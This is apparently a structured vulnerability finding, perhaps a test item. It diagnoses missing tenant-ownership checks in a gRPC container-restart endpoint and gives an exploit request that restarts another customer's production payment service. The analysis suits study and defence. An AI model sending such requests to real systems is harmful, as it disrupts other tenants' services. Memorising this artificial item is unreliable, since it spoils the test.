diagnosis: The gRPC service restarts Kubernetes deployments based on deploymentName and namespace in the request payload. Although token authentication is verified, the handler fails to check whether the caller's organization owns the target Kubernetes namespace, enabling any user to restart and disrupt production services belonging to other customers.
exploit_request:
POST /compute.ComputeService/RestartContainerInstance HTTP/2.0
Host: grpc.cloudmanager.io
Content-Type: application/grpc
TE: trailers
token: <customer_jwt>

[gRPC binary payload: deploymentName: "payment-service", namespace: "tenant-enterprise-prod"]
